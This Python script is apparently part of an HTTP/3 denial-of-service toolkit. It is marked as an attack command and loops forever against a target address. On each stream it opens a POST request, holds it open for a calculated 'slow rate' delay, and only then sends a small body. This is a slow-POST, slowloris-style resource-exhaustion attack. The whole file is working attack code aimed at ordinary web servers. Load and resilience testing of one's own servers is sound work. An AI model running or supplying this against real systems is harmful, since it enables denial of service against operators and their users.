
import asyncio
import logging
from aioquic_http3_client import USER_AGENT, HttpClient
from utils import attack_command, calculate_slowrate_wait_time, h3_connection_loop, h3_request_stream

logging.basicConfig(level=logging.INFO, format='%(asctime)s %(levelname)s:%(name)s:%(message)s', datefmt='%Y-%m-%dT%H:%M:%S')


@attack_command()
@h3_connection_loop()
async def main(addr, con: HttpClient, *args, **kwargs):
    h3_con = con.http
    while True:
        async with h3_request_stream(con) as stream_id:
            h3_con.send_headers(stream_id, headers=[
                (b":method", b'POST'),
                (b":scheme", b'https'),
                (b":authority", f'{addr[0]}:{addr[1]}'.encode()),
                (b":path", b'/'),
                (b"user-agent", USER_AGENT.encode()),
            ], end_stream=False)
            con.transmit()

            await asyncio.sleep(calculate_slowrate_wait_time(con._quic))

            h3_con.send_data(stream_id, data=b'key=value', end_stream=True)


if __name__ == '__main__':
    main()
